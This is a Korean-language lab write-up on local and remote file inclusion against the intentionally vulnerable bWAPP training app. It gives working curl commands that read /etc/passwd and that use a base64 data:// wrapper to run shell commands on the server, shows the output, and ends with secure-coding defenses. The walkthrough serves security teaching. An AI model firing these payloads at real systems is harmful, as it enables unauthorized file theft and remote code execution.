# 웹 해킹 실습 교육: Remote & Local File Inclusion (RFI/LFI)

> **교육 목적 전용 (For Educational Purposes Only)**  
> 본 문서는 bWAPP(Bee-Box) 취약점 실습 환경을 대상으로 작성되었습니다.  
> 허가 없이 타인의 시스템에 적용하는 것은 불법입니다.

---

## 📋 실습 환경 정보

| 항목 | 내용 |
|------|------|
| **대상 서버** | `192.168.0.20` (bWAPP Bee-Box) |
| **공격자 서버** | `192.168.0.146` (Kali Linux) |
| **실습 URL** | `http://192.168.0.20/bWAPP/rlfi.php` |
| **계정 정보** | `bee / bug` |
| **보안 레벨** | Low (Security Level: 0) |
| **실습 일시** | 2026-04-20 |

---

## 🎯 취약점 개요

### LFI (Local File Inclusion) 및 RFI (Remote File Inclusion)란?

웹 어플리케이션(특히 PHP)이 포함할 파일의 경로를 사용자 입력(URL 파라미터 등)으로 받을 때, 적절한 검증이나 필터링 처리 없이 `include()`, `require()` 등의 함수로 넘길 경우 발생합니다.

- **LFI (Local File Inclusion):** 서버 내부에 있는 패스워드 파일(`/etc/passwd` 등)이나 로그 파일, 환경 설정 파일 등을 읽어 들여 시스템 정보를 탈취하는 기법입니다.
- **RFI (Remote File Inclusion):** 공격자가 원격지(외부 해커 서버)에 작성해 둔 악의적인 스크립트 파일을 현재 서버가 동적으로 다운로드 및 인클루딩하여 서버의 통제권을 넘겨받는 (RCE) 더 위험한 기법입니다.
- **PHP Wrapper 우회 공격:** PHP에서는 파일 경로 대신 `php://`, `data://` 와 같은 특수 Wrapper를 지원하여 파일 인클루전을 직접적인 **명령어 실행(RCE)** 공격으로 확장시킬 수 있습니다.

### OWASP Top 10 분류
- **A01:2021** – Broken Access Control (과거 권한 외 파일 접근)
- **A03:2021** – Injection (악성 스크립트 인젝션)

---

## 🔍 공격 흐름 다이어그램

```
[공격자 (Kali Linux)]
        │
        ▼
[1단계] 취약 페이지 (rlfi.php) 분석
        (language=lang_en.php 와 같은 파일 호출 파라미터 식별)
        │
        ▼
[2단계] 기초 LFI 공격 (시스템 정보 파일 추출)
        (language 파라미터에 '/etc/passwd' 절대 경로를 투입하여 확인)
        │
        ▼
[3단계] 고도화 RFI / Wrapper 공격 (서버 제어권 탈취 - RCE)
        (PHP Data Wrapper를 삽입하여 OS 명령어 'id', 'cat' 등을 강제 실행)
```

---

## 🛠️ 단계별 실습 (실제 실행 명령어)

### Step 1: LFI 기법을 통한 시스템 계정 정보 탈취 (Path Traversal 활용)

파라미터 `language`가 동적으로 파일 경로를 호출하고 있다는 점을 이용해, `lang_en.php` 대신 시스템 고유 파일인 리눅스 암호/계정 리스트(`passwd`)를 강제 포함해봅니다.

```bash
# language 파라미터에 절대 경로 파일 삽입
curl -s \
     -b /home/kali/docker_exam/bwapp_cookie.txt \
     -c /home/kali/docker_exam/bwapp_cookie.txt \
     "http://192.168.0.20/bWAPP/rlfi.php?language=/etc/passwd&action=go" | grep -i -A 10 "root:"
```

**실행 결과:**
```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
... (기타 모든 시스템 계정 노출됨)
```
> 💡 서버 백엔드의 `include("/etc/passwd");` 구문이 동작하여 민감한 파일의 텍스트가 브라우저에 그대로 반환된 것입니다.

---

### Step 2: PHP Wrapper(`data://`)를 이용한 OS 원격 명령 실행 (RCE)

서버(bWAPP) 측의 `allow_url_include` 옵션이 켜져있다면 외부 파일이나 데이터 프로토콜을 그대로 코드로 실행시킬 수 있습니다.
`<?php system("id"); ?>` 코드를 Base64 인코딩(`PD9waHAgc3lzdGVtKCJpZCIpOyA/Pg==`)한 뒤 File Inclusion 파라미터에 찔러 넣습니다.

```bash
# data:// 래퍼를 사용하여 서버 공격 및 RCE 권한 증명
curl -s \
     -b /home/kali/docker_exam/bwapp_cookie.txt \
     -c /home/kali/docker_exam/bwapp_cookie.txt \
     "http://192.168.0.20/bWAPP/rlfi.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCJpZCIpOyA/Pg==&action=go" | grep -i "uid="
```

**실행 결과:**
```html
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
> 🚨 **치명적 위험**: 위 내용은 공격자가 전송한 Base64 문자열을 bWAPP 서버가 PHP 스크립트로 오인하여 해석(Include)하였으며, 결과적으로 서버 OS의 자원명령(`id`)이 직접 실행된 참담한 해킹의 결과입니다. (`cat`, `wget`, `nc` 모든 명령을 수행할 수 있게 됩니다.)

---

## 📊 탈취(추출) 정보 요약

| 정보 유형 | 탈취된 데이터 내용 |
|-----------|------------------|
| **(LFI) 서버 설정 파일** | `/etc/passwd` 파일 등 운영체제 내부 시스템의 물리적 파일 전문 탈취 |
| **(RFI/Wrapper) 명령어 실행권한**| `<?php system("명령어"); ?>` 형태의 인젝션으로 OS 내부 통제 권한 (`www-data`) 완전 획득 성공 |

---

## 🛡️ 취약점 발생 원인 및 방어 기법

### 취약점 메커니즘
해당 PHP 백엔드 (Low 레벨) 에서는 변수 검증 없이 GET 파라미터를 곧바로 Include 함수의 인자로 전달하고 있습니다.
```php
// bWAPP 취약 로직
$language = $_GET["language"];
include($language);  // 필터링 부재
```

### 방어(Secure Coding) 가이드

1. **사용자 입력의 직접적 포함(Include) 엄금 (화이트리스트 구조화) ⭐️**
   입력값을 이용해 파일을 인클루드 해야만 한다면 반드시 코드를 화이트리스트 배열로 제한해야 합니다. (Medium/High 방어 구조)
   ```php
   // bWAPP Security Level 2 (High)의 실제 방어 구조:
   $available_languages = array("lang_en.php", "lang_fr.php", "lang_nl.php");
   if(in_array($_GET["language"], $available_languages)) {
       include($_GET["language"]);
   }
   ```
2. **원격 인클루드 차단 (php.ini 최적화)**
   - PHP 설정 파일인 `php.ini` 에서 `allow_url_include = Off` (최신 PHP에서는 기본적으로 Off)로 조치하여 외부 스크립트 삽입이나 `data://` wrapper RCE 등 RFI 공격의 근본 원인을 제거해야 합니다.
3. **경로 탐색 문자 제어**
   - 상위 디렉토리로 이동하는 탐색 문자(`../` 등) 와 널 바이트 `%00`를 정규표현식이나 `str_replace()` 등을 이용햐 서버 차원에서 삭제합니다. (`basename()` 함수 등 활용)

---

## ⚖️ 법적 고지

> 이 문서의 모든 기법은 **bWAPP(Bee-Box)** 의도적 취약 환경에서  
> **교육 목적**으로만 수행되었습니다.  
> 허가받지 않은 환경에 해당 기술을 활용할 경우 **심각한 불법 행위**로 간주됩니다.
> 반드시 본인 소유 또는 적법한 동의를 얻은 환경 내에서 활용하십시오.

---

*작성일: 2026-04-20 | 실습 환경: Kali Linux + bWAPP Bee-Box | 작성: ngnicky-ai*
